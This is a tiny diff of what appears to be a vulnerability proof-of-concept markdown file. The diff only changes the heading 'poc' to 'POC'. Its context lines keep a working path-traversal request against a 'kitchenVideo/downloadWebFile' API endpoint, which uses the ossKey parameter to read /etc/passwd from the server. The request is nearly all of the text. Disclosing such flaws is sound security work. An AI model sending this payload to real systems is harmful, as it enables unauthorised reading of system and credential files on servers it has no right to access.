@@ -2,7 +2,7 @@
 
 
 
-## poc
+## POC
 
 ```java
 GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
